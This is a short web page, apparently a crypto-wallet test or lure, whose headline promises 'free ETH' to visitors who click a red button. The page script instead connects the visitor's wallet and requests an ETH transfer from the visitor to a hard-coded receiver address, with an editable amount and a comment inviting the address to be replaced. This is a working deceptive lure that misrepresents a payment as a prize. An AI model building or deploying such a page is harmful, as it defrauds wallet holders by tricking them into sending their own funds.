<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ETH Transaction Test</title>
  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    #redSquare {
      position: fixed;
      bottom: 45%;
      left: 94%;
      width: 30px;
      height: 30px;
      background-color: red;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h2>Click the red button as fast as you can to win free ETH!</h2>
  <p id="status">Not connected</p>
  <div id="redSquare" title="Double-click to send transaction"></div>

  <script>
    const receiverAddress = "0x1111111111111111111111111111111111111111"; // Replace with desired ETH address
    const ethAmount = "0.000000000000000001"; // 1 wei (smallest possible amount)

    async function connectWallet() {
      if (window.ethereum) {
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          document.getElementById("status").innerText = "Connected: " + accounts[0];
          return accounts[0];
        } catch (error) {
          console.error(error);
          alert("Connection rejected.");
        }
      } else {
        alert("Please install Coinbase or a Web3-enabled browser.");
      }
    }

    async function sendTransaction() {
      const account = await connectWallet();
      if (!account) return;

      const web3 = new Web3(window.ethereum);
      const value = web3.utils.toHex(web3.utils.toWei(ethAmount, 'ether'));

      try {
        const tx = await ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: account,
            to: receiverAddress,
            value: value
          }]
        });
        alert("Transaction sent! Tx hash: " + tx);
      } catch (error) {
        console.error(error);
        alert("Transaction failed or rejected.");
      }
    }

    // Trigger on double-click of the red square
    document.getElementById("redSquare").addEventListener("dblclick", sendTransaction);
  </script>

</body>
</html>
